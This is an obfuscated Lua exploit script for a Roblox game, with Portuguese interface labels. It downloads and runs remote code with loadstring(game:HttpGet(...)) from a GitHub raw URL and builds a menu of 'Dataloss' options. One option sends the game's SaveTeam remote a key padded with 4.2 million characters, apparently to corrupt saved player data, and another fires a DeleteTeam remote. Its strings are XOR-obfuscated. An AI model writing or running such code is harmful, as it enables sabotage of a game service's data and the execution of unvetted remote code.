--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v14,v15)local v16={};for v19=1, #v14 do v6(v16,v0(v4(v1(v2(v14,v19,v19 + 1 )),v1(v2(v15,1 + (v19% #v15) ,1 + (v19% #v15) + 1 )))%256 ));end return v5(v16);end local v8=loadstring(game:HttpGet("https://raw.githubusercontent.com/Biielziin/BLZBlox/main/modules/module.lua"))();local v9=v8.Load({[v7("\229\202\207\41\227","\126\177\163\187\69\134\219\167")]=v7("\7\232\28\133\177\99\239\35\192\240\57\141\17\133\201\51\201\43\209\249\99\156\100\150\188\30","\156\67\173\74\165"),[v7("\7\163\80\26\185","\38\84\215\41\118\220\70")]=3 -2 ,[v7("\99\31\56\23\198","\158\48\118\66\114")]=5 + 495 ,[v7("\152\45\10\51\74","\155\203\68\112\86\19\197")]=181 + 49 ,[v7("\114\213\51\241\69","\152\38\189\86\156\32\24\133")]=v7("\216\86\181\77","\38\156\55\199"),[v7("\139\114\112\39\1\91\236\70\186\111\117\44\22\103","\35\200\29\28\72\115\20\154")]={[v7("\52\190\216\209\171\62\53\20\186","\84\121\223\177\191\237\76")]=Color3.fromRGB(1090 -(87 + 968) ,154 -119 ,35)}});local v10=v9.New({[v7("\143\95\221\172\63","\161\219\54\169\192\90\48\80")]=v7("\100\71\14\48","\69\41\34\96")});local v11=v10.Button({[v7("\136\198\207\30","\75\220\163\183\106\98")]="Você não selecionou nenhuma opção",[v7("\33\187\135\59\219\3\185\128","\185\98\218\235\87")]=function()if (Type==v7("\226\50\46\229\215\171\217\124\3\231\202\171\199\51\52\245","\202\171\92\71\134\190")) then local v20=0 + 0 ;local v21;while true do if (v20==(0 -0)) then v21={[1414 -(447 + 966) ]={["1\0"   .. string.rep("B",4200000) ]=require(game.ReplicatedStorage.ModuleScripts.LocalDairebStore).GetStoreProxy(v7("\14\192\33\141\13\192\56\137","\232\73\161\76")):GetData(v7("\139\220\86\78","\126\219\185\34\61"))[2 -1 ].UID},[2]=v7("\45\232\109\77\87\100\204\195\3\201\77\122\119\99","\135\108\174\62\18\30\23\147"),[1820 -(1703 + 114) ]=3};game:GetService(v7("\132\236\58\199\17\173\50\211\179\237\25\223\23\188\50\192\179","\167\214\137\74\171\120\206\83")).Remote.SaveTeam:FireServer(unpack(v21));v20=702 -(376 + 325) ;end if (v20==(1 -0)) then TextField:SetText(v7("\162\254\59\94\241\166\143\255","\199\235\144\82\61\152"));break;end end elseif (Type==v7("\35\19\170\45\6\12\188\57\71\50\184\63\6\26\182\56\20","\75\103\118\217")) then for v22,v23 in pairs(game.Players.LocalPlayer.PlayerGui.MainGui.Pets.TeamsList.Main.Scroll:GetDescendants()) do if ((v23.Name==v7("\243\81\113\25\151\31\202\81","\126\167\52\16\116\217")) and (v23.Text==v7("\233\8\19\191\157\10\195\236\33\39\147\188\16\232","\156\168\78\64\224\212\121"))) then local v24={[2 -1 ]=v23.Parent.LayoutOrder};game:GetService(v7("\53\235\181\194\14\237\164\218\2\234\150\218\8\252\164\201\2","\174\103\142\197")).Remote.DeleteTeam:FireServer(unpack(v24));TextField:SetText(v7("\114\45\76\62\32\87\236\89","\152\54\72\63\88\69\62"));break;end end end end});local v12=v10.Dropdown({[v7("\224\193\246\72","\60\180\164\142")]="Opção de Dataloss",[v7("\123\95\9\37\37\236\17\83","\114\56\62\101\73\71\141")]=function(v17)getgenv().Type=v17;end,[v7("\151\249\207\205\183\231\200","\164\216\137\187")]={v7("\251\232\56\177\175\255\25\146\194\48\166\167\242\4\193\245","\107\178\134\81\210\198\158"),v7("\28\11\145\192\171\34\11\144\134\142\57\26\131\202\165\43\29","\202\88\110\226\166")}});getgenv().TextField=v10.TextField({[v7("\247\10\154\227","\170\163\111\226\151")]=v7("\34\36\179\44\91\36","\73\113\80\210\88\46\87"),[v7("\181\53\221\23","\135\225\76\173\114")]=v7("\62\232\190\177\185\177\179","\199\122\141\216\208\204\221")});while task.wait() do if Type then v11:SetText(Type);end end